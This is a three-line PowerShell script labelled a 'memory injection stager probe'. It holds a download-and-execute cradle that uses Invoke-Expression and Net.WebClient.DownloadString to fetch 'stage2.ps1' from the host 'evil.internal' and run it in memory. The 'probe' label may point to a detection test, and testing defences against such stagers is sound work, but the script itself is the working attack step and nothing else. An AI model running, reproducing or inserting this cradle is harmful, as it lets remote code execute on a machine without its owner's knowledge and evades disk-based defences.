# PowerShell memory injection stager probe
$cmd = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.internal/stage2.ps1')"
IEX($cmd)
